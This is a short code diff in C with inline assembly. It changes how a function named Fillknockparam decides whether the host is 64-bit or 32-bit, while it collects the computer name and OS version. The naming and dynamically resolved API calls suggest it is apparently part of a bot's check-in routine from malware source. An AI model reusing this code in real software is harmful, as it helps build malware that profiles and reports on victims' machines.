@@ -456,26 +456,13 @@ void Fillknockparam(LPVOID chunk,LPSTR str)
 	urlencode(computer);
 	__asm
 		{
-			jmp label2
-			backe2:
-			push fs:[0x00]
-			mov DWORD ptr fs:[0x0],esp
 			mov eax,fs:[0xc0]
-			pop eax
-			mov fs:[0x00],eax
-			add esp,4
+			test eax,eax
+			jz Bits32
 		}
 	CWA(lstrcpyA,kernel32,bits,_b64);
 	goto next;
-	__asm
-	{
-label2:
-		call backe2
-		mov esp,[esp+8]
-		pop eax
-		mov fs:[0x00],eax
-		add esp,4
-	}
+Bits32:
 	CWA(lstrcpyA,kernel32,bits,_b32);
 next:
 	((LPOSVERSIONINFOA)windows)->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
